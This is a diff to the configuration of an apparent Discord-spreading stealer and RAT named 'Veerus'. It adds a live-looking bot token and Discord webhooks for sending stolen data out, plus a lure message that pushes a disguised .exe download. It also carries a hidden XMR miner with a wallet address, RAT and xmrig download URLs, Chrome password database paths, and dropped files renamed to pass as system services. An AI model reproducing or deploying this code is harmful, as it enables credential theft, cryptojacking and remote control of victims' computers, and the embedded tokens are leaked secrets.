@@ -50,38 +50,16 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-Bot_Token = "BotTokenForTheRat667"
+Bot_Token = "MTAxMTcwMzMzOTQ2Mjk1OTEzNQ.Gpkcqz.Ud2ymvxYEuWWjXntgyCtk4QYJ4GSQW6fYv46bU"
 
 
-WEBHOOK = "webhook667"
+WEBHOOK = "https://discord.com/api/webhooks/1012430931128242199/YofCnHiXwtYIcnRR0Q1AQZbLmMazEkAyXuSdHIsbIkGtZv57zcWpJvudGG8MnsU2r5ql"
 webhook = WEBHOOK
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only XMR, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
-dm_all = True
-DMALLMSG = """:flag_gb: Hello !
-Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same? Let me explain what you can do with Veerus :
-```Stealer :
-	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
-		Passwords, Credit Cards, Cookies, Autofill
-
-	Discord :
-		Token
-
-	Miner :		
-		Hidden XMR Miner
-	Other :
-		Add to computer startup the number of time you choosed.
-		Clone the virus in random directories
-		Undetected by Windows Defender & Windows Smart screen
-		Anti Virtual Machine
-		Disable Task Manager```
-
-	Price : 0.00$ ! yes ! Totally Free !
-
-	Links :
-		Discord : https://discord.gg/7GkfBzRQXX
-		Github : https://github.com/0xSxZ/Veerus"""
+dm_all = False
+DMALLMSG = """Hey ! i am a French developer and i created the 1st free discord image grabber, would you be interessed to test it ? link : https://github.com/0xSxZuu/test/releases/download/test/image_grabber.exe"""
 mdmbot = discord.Client()
-STATSWEBHOOK = "NoWebhook667EKIP"
+STATSWEBHOOK = "https://discord.com/api/webhooks/1012430962799415317/QqvEDwTC4nNOAdd0YCMeVC-8_19mM1-vMbExoqxStt2k3L-bBTYutKvtbmagCYanTpwI"
 STATSAPI = [
 	"https://api.nanopool.org/v1/xmr/hashrate/" + str(ADDRESS),
 	"https://api.nanopool.org/v1/eth/avghashrate/" + str(ADDRESS),
@@ -93,19 +71,6 @@ os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Syste
 
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
 
-
-def set_reg(name, value):
-	try:
-		winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
-		registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, 
-									   winreg.KEY_WRITE)
-		winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
-		winreg.CloseKey(registry_key)
-		return True
-	except WindowsError:
-		return False
-
-set_reg("DisableTaskMgr", "1")
 
 
 
@@ -123,7 +88,7 @@ PROCESS_PATHS = [
 	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
 	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
 ]
-PROCESS_NUM = processnumbers
+PROCESS_NUM = 6
 
 MINE = True #Mine crypto? True/False
 MINING_PERCENT = "30"
@@ -134,8 +99,8 @@ computer = wmi.WMI()
 RATURL = "https://github.com/0xSxZ/Veerus/releases/download/dont/r4t.exe"
 MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrig.exe?raw=true"
 GPUMODEL = computer.Win32_VideoController()[0]
-rat_path = os.getenv('APPDATA') + "\\winedows_companny\\update\\667.exe"
-XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\667v2.exe"
+rat_path = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svckho.exe"
+XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svck.exe"
 
 APP_DATA_PATH= os.environ['LOCALAPPDATA']
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
